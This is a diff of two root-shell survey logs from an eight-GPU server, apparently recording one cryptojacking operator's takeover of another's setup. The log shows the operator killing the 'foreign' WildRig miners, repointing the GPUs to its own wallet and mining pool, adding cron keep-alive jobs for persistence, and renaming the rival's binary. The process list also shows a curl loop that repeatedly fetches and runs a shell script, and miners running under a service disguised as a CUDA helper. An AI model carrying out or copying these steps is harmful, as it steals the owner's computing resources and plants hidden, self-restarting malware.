@@ -1,64 +1,83 @@
 Warning: Permanently added '123.184.7.135' (ED25519) to the list of known hosts.
-### BASELINE 2026-11-24T18:28:55Z
-uid=0(root) gid=0(root) groups=0(root)
-g0023
-x86_64
-128
-### GPU
-GPU 0: NVIDIA A800-SXM4-80GB (UUID: GPU-1a616365-4581-31e6-1446-24a2457bc664)
-GPU 1: NVIDIA A800-SXM4-80GB (UUID: GPU-a1864ba2-3cb8-96bd-8b5e-b9161ef11bbc)
-GPU 2: NVIDIA A800-SXM4-80GB (UUID: GPU-d7dab522-fa0d-7fe8-dc36-3b395af93346)
-GPU 3: NVIDIA A800-SXM4-80GB (UUID: GPU-2ba4a927-d17a-4245-fcdc-77ea11b8dcc1)
-GPU 4: NVIDIA A800-SXM4-80GB (UUID: GPU-9b1adbd5-38c8-715d-a473-d70be061b8c9)
-GPU 5: NVIDIA A800-SXM4-80GB (UUID: GPU-12938f56-7015-a955-3656-20f28ed2e8c8)
-GPU 6: NVIDIA A800-SXM4-80GB (UUID: GPU-57bb3c06-75b7-39f2-167f-45223d4f35fa)
-GPU 7: NVIDIA A800-SXM4-80GB (UUID: GPU-933ea211-0623-e337-e5d3-83b489ca00db)
-0, NVIDIA A800-SXM4-80GB, 81920 MiB, 75639 MiB, 100 %
-1, NVIDIA A800-SXM4-80GB, 81920 MiB, 75637 MiB, 100 %
-2, NVIDIA A800-SXM4-80GB, 81920 MiB, 72130 MiB, 100 %
-3, NVIDIA A800-SXM4-80GB, 81920 MiB, 2866 MiB, 100 %
-4, NVIDIA A800-SXM4-80GB, 81920 MiB, 2866 MiB, 100 %
-5, NVIDIA A800-SXM4-80GB, 81920 MiB, 2866 MiB, 100 %
-6, NVIDIA A800-SXM4-80GB, 81920 MiB, 2866 MiB, 100 %
-7, NVIDIA A800-SXM4-80GB, 81920 MiB, 2866 MiB, 100 %
-### PROCS-BEFORE
-3188149 root     /opt/t19/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l --worker plh-123-184-7-135-g3 --pass x --protocol stratum --opencl-devices 3 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1963
-3188298 root     /opt/t19/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l --worker plh-123-184-7-135-g4 --pass x --protocol stratum --opencl-devices 4 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1964
-3188437 root     /opt/t19/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l --worker plh-123-184-7-135-g5 --pass x --protocol stratum --opencl-devices 5 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1965
-3188571 root     /opt/t19/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l --worker plh-123-184-7-135-g6 --pass x --protocol stratum --opencl-devices 6 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1966
-3279173 root     /opt/t19/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l --worker plh-123-184-7-135-g0 --pass x --protocol stratum --opencl-devices 0 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1960
-3279210 root     /opt/t19/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l --worker plh-123-184-7-135-g1 --pass x --protocol stratum --opencl-devices 1 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1961
-3279245 root     /opt/t19/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l --worker plh-123-184-7-135-g2 --pass x --protocol stratum --opencl-devices 2 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1962
-3347963 root     /opt/t19/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l --worker plh-123-184-7-135-g7 --pass x --protocol stratum --opencl-devices 7 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1967
-### UNITS
-  nv-cuda-cache.service                  loaded    active     running      nv cuda cache helper
-  plh-card@0.service                     loaded    active     running      PLH PEARL miner card 0
-  plh-card@1.service                     loaded    active     running      PLH PEARL miner card 1
-  plh-card@2.service                     loaded    active     running      PLH PEARL miner card 2
-  plh-card@3.service                     loaded    active     running      PLH PEARL miner card 3
-  plh-card@4.service                     loaded    active     running      PLH PEARL miner card 4
-  plh-card@5.service                     loaded    active     running      PLH PEARL miner card 5
-  plh-card@6.service                     loaded    active     running      PLH PEARL miner card 6
-  plh-card@7.service                     loaded    active     running      PLH PEARL miner card 7
-### CRON
-*/2 * * * * /usr/local/node_exporter/get_hardware_info_v3 high >> /var/log/hardware_info_high.log 2>&1
-0 * * * * /usr/local/node_exporter/get_hardware_info_v3 middle >> /var/log/hardware_info_middle.log 2>&1
-0 1 * * * /usr/local/node_exporter/get_hardware_info_v3 low >> /var/log/hardware_info_low.log 2>&1
-@reboot /usr/local/node_exporter/get_hardware_info_v3 once_boot >> /var/log/hardware_info_boot.log 2>&1
-31 21 * * * "/root/.acme.sh"/acme.sh --cron --home "/root/.acme.sh" > /dev/null
-0 2 * * * /ssd/vendors/QD_GLAD/npa_bicm/mysql/backup/scripts/backup.sh >>/ssd/vendors/QD_GLAD/npa_bicm/mysql/backup/scripts/backup.log 2>&1
-@reboot /bin/sh /root/.k/keep.sh /root/.k ul-t2-123-184-7-135-g0 prl-sg.kryptex.network:7048 >/dev/null 2>&1
-*/5 * * * * /bin/sh /root/.k/keep.sh /root/.k ul-t2-123-184-7-135-g0 prl-sg.kryptex.network:7048 >/dev/null 2>&1
-total 32
-drwxr-xr-x   2 root root  4096 Nov 25 00:49 .
-drwxr-xr-x 132 root root 12288 Nov  4 18:26 ..
--rw-r--r--   1 root root   102 Mar 23  2022 .placeholder
--rw-r--r--   1 root root   201 Jan  9  2022 e2scrub_all
--rw-r--r--   1 root root    74 Nov 25 00:49 plh-keepalive
--rw-r--r--   1 root root    75 Apr 16  2026 root
-### FILES-OPT
+### TREE 2026-11-24T18:33:42Z
+1491281       1 root     /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g3 --pass x --protocol stratum --opencl-devices 3 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1963
+1491294       1 root     /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g4 --pass x --protocol stratum --opencl-devices 4 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1964
+1491307       1 root     /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g5 --pass x --protocol stratum --opencl-devices 5 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1965
+1491775       1 root     /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g6 --pass x --protocol stratum --opencl-devices 6 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1966
+1492181       1 root     /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g0 --pass x --protocol stratum --opencl-devices 0 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1960
+1492207       1 root     /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g1 --pass x --protocol stratum --opencl-devices 1 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1961
+1492211       1 root     /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g2 --pass x --protocol stratum --opencl-devices 2 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1962
+1492214       1 root     /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g7 --pass x --protocol stratum --opencl-devices 7 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1967
+1495455       1 root     /opt/t19/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l --worker plh-123-184-7-135-g0 --pass x --protocol stratum --opencl-devices 0 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1960
+1495477       1 root     /opt/t19/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l --worker plh-123-184-7-135-g3 --pass x --protocol stratum --opencl-devices 3 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1963
+1495486       1 root     /opt/t19/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l --worker plh-123-184-7-135-g4 --pass x --protocol stratum --opencl-devices 4 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1964
+1495493       1 root     /opt/t19/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l --worker plh-123-184-7-135-g5 --pass x --protocol stratum --opencl-devices 5 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1965
+1495502       1 root     /opt/t19/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l --worker plh-123-184-7-135-g6 --pass x --protocol stratum --opencl-devices 6 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1966
+3279210       1 root     /opt/t19/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l --worker plh-123-184-7-135-g1 --pass x --protocol stratum --opencl-devices 1 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1961
+3279245       1 root     /opt/t19/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l --worker plh-123-184-7-135-g2 --pass x --protocol stratum --opencl-devices 2 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1962
+3347963       1 root     /opt/t19/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l --worker plh-123-184-7-135-g7 --pass x --protocol stratum --opencl-devices 7 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1967
+### PARENTS-OF-FOREIGN
+pid=1495455 ppid=1 parent=/lib/systemd/systemd nopti nospectre_v2 nospec_store_bypass_disable --system --deserialize 67 
+pid=1495477 ppid=1 parent=/lib/systemd/systemd nopti nospectre_v2 nospec_store_bypass_disable --system --deserialize 67 
+pid=1495486 ppid=1 parent=/lib/systemd/systemd nopti nospectre_v2 nospec_store_bypass_disable --system --deserialize 67 
+pid=1495493 ppid=1 parent=/lib/systemd/systemd nopti nospectre_v2 nospec_store_bypass_disable --system --deserialize 67 
+pid=1495502 ppid=1 parent=/lib/systemd/systemd nopti nospectre_v2 nospec_store_bypass_disable --system --deserialize 67 
+pid=3279210 ppid=1 parent=/lib/systemd/systemd nopti nospectre_v2 nospec_store_bypass_disable --system --deserialize 67 
+pid=3279245 ppid=1 parent=/lib/systemd/systemd nopti nospectre_v2 nospec_store_bypass_disable --system --deserialize 67 
+pid=3347963 ppid=1 parent=/lib/systemd/systemd nopti nospectre_v2 nospec_store_bypass_disable --system --deserialize 67 
+### SSH-SESSIONS
+root     pts/2        Tue Nov 24 13:33 - 18:09  (04:36)     223.104.194.140
+root     pts/0        Tue Nov 24 13:33 - 18:09  (04:36)     223.104.194.140
+root     pts/2        Tue Nov 24 09:15 - 11:28  (02:13)     223.104.194.140
+root     pts/0        Tue Nov 24 09:15 - 11:28  (02:13)     223.104.194.140
+root     pts/2        Mon Nov 23 10:12 - 10:17  (00:04)     58.56.96.29
+root     pts/0        Mon Nov 23 10:12 - 10:17  (00:04)     58.56.96.29
+root     pts/2        Fri Nov 20 17:37 - 18:05  (00:27)     58.56.96.29
+root     pts/0        Fri Nov 20 17:37 - 18:05  (00:27)     58.56.96.29
+### BINARY-OWN-COPY
+-rwxr-xr-x 1 root root 29725148 Nov 25 02:33 /root/ul/wildrig-multi
+d403b3b8a6caafc273190b4e71e0672e  /root/ul/wildrig-multi
+d403b3b8a6caafc273190b4e71e0672e  /opt/t19/wildrig-multi
+### KILL-FOREIGN (3 rounds)
+killed 1495455
+killed 1495477
+killed 1495486
+killed 1495493
+killed 1495502
+killed 3279210
+killed 3279245
+killed 3347963
+### KILL-WATCHDOG-CANDIDATES
+1491281       1 /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g3 --pass x --protocol stratum --opencl-devices 3 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1963
+1491294       1 /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g4 --pass x --protocol stratum --opencl-devices 4 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1964
+1491307       1 /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g5 --pass x --protocol stratum --opencl-devices 5 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1965
+1491775       1 /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g6 --pass x --protocol stratum --opencl-devices 6 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1966
+1492181       1 /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g0 --pass x --protocol stratum --opencl-devices 0 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1960
+1492207       1 /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g1 --pass x --protocol stratum --opencl-devices 1 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1961
+1492211       1 /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g2 --pass x --protocol stratum --opencl-devices 2 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1962
+1492214       1 /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g7 --pass x --protocol stratum --opencl-devices 7 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1967
+1505288       1 /usr/bin/python3 -m http.server 8090 --directory /opt/t19
+1768972       1 /opt/t19/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l --worker plh-123-184-7-135-g3 --pass x --protocol stratum --opencl-devices 3 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1963
+3711609       1 /bin/bash -c while true; do curl -sf http://127.0.0.1:8099/run.sh -o /tmp/r.sh 2>/dev/null && /bin/bash /tmp/r.sh >> /opt/t19/www/out.txt 2>&1; sleep 30; done --collect-interval 10
+3747434       1 /ssd/miniconda/bin/python3 /opt/t19/relay.py
+3822252       1 /usr/bin/python3 -u /opt/t19/www/srv2.py
+### STRATUM-HANDSHAKE
+prl-sg.kryptex.network 7048 ERR [Errno 104] Connection reset by peer
+pool.pearlhash.xyz 9000 ERR [Errno 104] Connection reset by peer
+POOL=pool.pearlhash.xyz:9000
+### START-8
+START ul-t2-123-184-7-135-g0 pool pool.pearlhash.xyz:9000
+START ul-t2-123-184-7-135-g1 pool pool.pearlhash.xyz:9000
+START ul-t2-123-184-7-135-g2 pool pool.pearlhash.xyz:9000
+START ul-t2-123-184-7-135-g3 pool pool.pearlhash.xyz:9000
+START ul-t2-123-184-7-135-g4 pool pool.pearlhash.xyz:9000
+START ul-t2-123-184-7-135-g5 pool pool.pearlhash.xyz:9000
+START ul-t2-123-184-7-135-g6 pool pool.pearlhash.xyz:9000
+START ul-t2-123-184-7-135-g7 pool pool.pearlhash.xyz:9000
+### NEUTRALIZE-FOREIGN-BINARY
+moved /opt/t19/wildrig-multi -> .orig
 total 208940
-drwxr-xr-x  6 root   root        4096 Nov 24 13:57 .
+drwxr-xr-x  6 root   root        4096 Nov 25 02:33 .
 drwxr-xr-x 16 root   root        4096 Nov 25 00:49 ..
 drwxr-xr-x  2 root   root        4096 Nov 24 05:06 bak
 -rwxr-xr-x  1 root   root         841 Nov 24 03:22 boot_krig.sh
@@ -67,211 +86,98 @@ drwxr-xr-x  2 root   root        4096 Nov 24 05:06 bak
 -rw-r--r--  1 root   root      599622 Nov 25 00:48 g1.log
 -rw-r--r--  1 root   root      599211 Nov 25 00:48 g2.log
 -rw-r--r--  1 root   root      600216 Nov 25 00:48 g3.log
--rw-r--r--  1 root   root      599848 Nov 25 00:48 g4.log
--rw-r--r--  1 root   root      600475 Nov 25 00:48 g5.log
--rw-r--r--  1 root   root      599488 Nov 25 00:48 g6.log
--rw-r--r--  1 root   root      600588 Nov 25 00:48 g7.log
--rw-r--r--  1 vendor vendor      6423 Jun  9  2025 help.txt
--rw-r--r--  1 root   root         669 Nov 25 02:28 k466.txt
--rwxr-xr-x  1 root   root         657 Nov 24 05:03 keep.sh
--rw-r--r--  1 root   root    29729454 Nov 24 14:11 kit.tgz
-drwxr-xr-x  2 root   root        4096 Nov 24 02:14 krig
--rw-r--r--  1 root   root   119697919 Nov 24 02:14 krig.tar.gz
-### SUPERVISOR-HUNT
-/root/vantage/out/farm_inv.txt
-/root/vllm-pkg/mineru-linux-cu124-vllm.tar.zst
-/root/.k/m.log
-/root/.k/w.gz
-/root/.k/keep.sh
-/opt/plh/keepalive.sh
-/opt/plh/run_gpu.sh
-/opt/plh/log/g7.log
-/opt/plh/log/g1.log
-/opt/plh/log/g4.log
-/opt/plh/log/g3.log
-/opt/plh/log/g2.log
-/opt/plh/log/g0.log
-/opt/plh/log/g6.log
-/opt/plh/log/g5.log
-/opt/plh/foreign_pre.txt
-/opt/t19/start-Qubitcoin-suprnova.cc.sh
-/opt/t19/start-Radiant.sh
-/opt/t19/g7.log
-/opt/t19/start-Zano.sh
-/opt/t19/readme.txt
-/opt/t19/start-Radiant_lockMemory.sh
-/opt/t19/start-Nexa.sh
-/opt/t19/www/hits.log
-/opt/t19/www/c19.sh
-/opt/t19/www/c18.sh
-/opt/t19/www/cmd1.sh
-/opt/t19/www/c16.sh
-/opt/t19/www/i6425_p2.txt
-/opt/t19/www/i6425_p1.txt
-/opt/t19/www/p17plant.sh
-/opt/t19/www/up/up_c19
-/opt/t19/www/up/up_c18
-/opt/t19/www/up/up_diag17
-/opt/t19/www/up/up_plant17
-/opt/t19/www/access.log
-/opt/t19/www/p18.txt
-/opt/t19/www/diag6421.txt
-/opt/t19/www/out.txt
-/opt/t19/www/tail.sh
-### POOL-PROBE-FROM-HOST
-prl-sg.kryptex.network:7048 OPEN
-prl-sg.kryptex.network:8048 OPEN
-prl-eu.kryptex.network:7048 OPEN
-prl-hk.kryptex.network:7048 OPEN
-pool.pearlhash.xyz:9000 OPEN
-pearl.luckypool.io:443 CLOSED
-POOL=prl-sg.kryptex.network:7048
-### REPOINT
-REPOINT old_pid=3188149 dev=3 worker=ul-t2-123-184-7-135-g3 api=1963 pool=prl-sg.kryptex.network:7048
-REPOINT old_pid=3188298 dev=4 worker=ul-t2-123-184-7-135-g4 api=1964 pool=prl-sg.kryptex.network:7048
-REPOINT old_pid=3188437 dev=5 worker=ul-t2-123-184-7-135-g5 api=1965 pool=prl-sg.kryptex.network:7048
-REPOINT old_pid=3188571 dev=6 worker=ul-t2-123-184-7-135-g6 api=1966 pool=prl-sg.kryptex.network:7048
-REPOINT old_pid=3279173 dev=0 worker=ul-t2-123-184-7-135-g0 api=1960 pool=prl-sg.kryptex.network:7048
-### FILL-GAPS
-GAP-START dev=1 worker=ul-t2-123-184-7-135-g1
-GAP-START dev=2 worker=ul-t2-123-184-7-135-g2
-GAP-START dev=7 worker=ul-t2-123-184-7-135-g7
-active
-*/5 * * * * /bin/sh /root/.k/keep.sh /root/.k ul-t2-123-184-7-135-g0 prl-sg.kryptex.network:7048 >/dev/null 2>&1
-@reboot /bin/bash /root/ul/keep.sh >> /root/ul/keep.log 2>&1
-*/5 * * * * /bin/bash /root/ul/keep.sh >> /root/ul/keep.log 2>&1
+### PERSIST
+unit=active
 ### PROCS-AFTER
-1491281 root     /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g3 --pass x --protocol stratum --opencl-devices 3 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1963
-1491294 root     /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g4 --pass x --protocol stratum --opencl-devices 4 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1964
-1491307 root     /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g5 --pass x --protocol stratum --opencl-devices 5 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1965
-1491775 root     /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g6 --pass x --protocol stratum --opencl-devices 6 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1966
-1492181 root     /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g0 --pass x --protocol stratum --opencl-devices 0 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1960
-1492207 root     /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g1 --pass x --protocol stratum --opencl-devices 1 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1961
-1492211 root     /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g2 --pass x --protocol stratum --opencl-devices 2 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1962
-1492214 root     /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g7 --pass x --protocol stratum --opencl-devices 7 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1967
-3279210 root     /opt/t19/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l --worker plh-123-184-7-135-g1 --pass x --protocol stratum --opencl-devices 1 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1961
-3279245 root     /opt/t19/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l --worker plh-123-184-7-135-g2 --pass x --protocol stratum --opencl-devices 2 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1962
-3347963 root     /opt/t19/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l --worker plh-123-184-7-135-g7 --pass x --protocol stratum --opencl-devices 7 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1967
-### LOCAL-API
-api 1960: {
-    "id": "",
-    "worker_id": "g0023",
-    "version": "0.52.3",
-    "kind": "opencl",
-    "ua": "WildRig/0.52.3L",
-    "algo": "pearlhash",
-    "donate_level
-api 1961: {
-    "id": "",
-    "worker_id": "g0023",
-    "version": "0.52.3",
-    "kind": "opencl",
-    "ua": "WildRig/0.52.3L",
-    "algo": "pearlhash",
-    "donate_level
-api 1962: {
-    "id": "",
-    "worker_id": "g0023",
-    "version": "0.52.3",
-    "kind": "opencl",
-    "ua": "WildRig/0.52.3L",
-    "algo": "pearlhash",
-    "donate_level
-api 1963: {
-    "id": "",
-    "worker_id": "g0023",
-    "version": "0.52.3",
-    "kind": "opencl",
-    "ua": "WildRig/0.52.3L",
-    "algo": "pearlhash",
-    "donate_level
-api 1964: {
-    "id": "",
-    "worker_id": "g0023",
-    "version": "0.52.3",
-    "kind": "opencl",
-    "ua": "WildRig/0.52.3L",
-    "algo": "pearlhash",
-    "donate_level
-api 1965: {
-    "id": "",
-    "worker_id": "g0023",
-    "version": "0.52.3",
-    "kind": "opencl",
-    "ua": "WildRig/0.52.3L",
-    "algo": "pearlhash",
-    "donate_level
-api 1966: {
-    "id": "",
-    "worker_id": "g0023",
-    "version": "0.52.3",
-    "kind": "opencl",
-    "ua": "WildRig/0.52.3L",
-    "algo": "pearlhash",
-    "donate_level
-api 1967: {
-    "id": "",
-    "worker_id": "g0023",
-    "version": "0.52.3",
-    "kind": "opencl",
-    "ua": "WildRig/0.52.3L",
-    "algo": "pearlhash",
-    "donate_level
-### MINER-LOGS
+1491281 /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g3 --pass x --protocol stratum --opencl-devices 3 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1963
+1491294 /opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g4 --pass x --protocol stratum --opencl-devices 4 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1964
